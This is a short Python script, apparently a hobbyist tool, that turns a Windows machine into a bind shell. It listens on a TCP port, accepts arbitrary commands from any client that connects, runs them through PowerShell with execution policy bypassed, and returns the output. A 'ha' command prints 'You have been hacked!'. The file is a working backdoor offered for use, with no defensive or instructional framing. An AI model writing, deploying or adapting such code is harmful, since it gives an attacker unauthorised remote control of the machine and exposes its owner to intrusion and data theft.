# Uses powershell so it needs to run on a wondows machine

import socket
import subprocess
import os


HOST = '192.168.1.201'    # Enter Laptop IP address here
PORT = 42069      # Enter a port number of your choice

s = socket.socket()
s.bind((HOST, PORT))
s.listen(1)
print(f'Listening on {HOST}:{PORT}')

conn, addr = s.accept()
print(f'Connected by {addr}')

while True:
    command = conn.recv(1024).decode().strip()
    if command.lower() == 'exit':
        break

    # Split command and arguments
    cmd_parts = command.split()
    cmd = cmd_parts[0]
    args = cmd_parts[1:]

    if cmd == 'ha':
        print("You have been hacked!")
    elif cmd == 'cd':
        try:
            os.chdir(args[0])
            conn.sendall(b'Successfully changed directory\n')
        except FileNotFoundError:
            conn.sendall(b'Directory not found\n')
        except Exception as e:
            conn.sendall(str(e).encode())
    else:
        # Create a PowerShell command to execute the command remotely
        ps_cmd = f'powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "{command}"'

        try:
            output = subprocess.check_output(ps_cmd, stderr=subprocess.STDOUT, shell=True, timeout=10)
            conn.sendall(output)
        except subprocess.CalledProcessError as e:
            conn.sendall(e.output)
        except subprocess.TimeoutExpired:
            conn.sendall(b'Command timed out\n')
        except Exception as e:
            conn.sendall(str(e).encode())

conn.close()
